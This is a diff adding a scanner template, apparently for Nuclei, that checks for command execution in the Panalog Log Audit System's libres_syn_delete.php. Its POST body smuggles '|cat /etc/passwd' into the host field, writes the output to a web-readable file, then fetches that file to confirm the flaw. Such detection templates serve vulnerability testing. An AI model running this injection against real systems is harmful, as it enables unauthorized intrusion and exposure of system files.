@@ -1,0 +1,49 @@
+id: panalog-libres-syn-delete-php-rce
+info:
+  name: Panalog Log Audit System libres_syn_delete.php Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-command-execution
+    method: POST
+    path:
+      - "{{BaseURL}}/content-apply/libres_syn_delete.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "token=1&id=2&host=|cat /etc/passwd >{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"yn":"yes","str":"OK"}'
+
+  - id: verify-command-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/content-apply/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
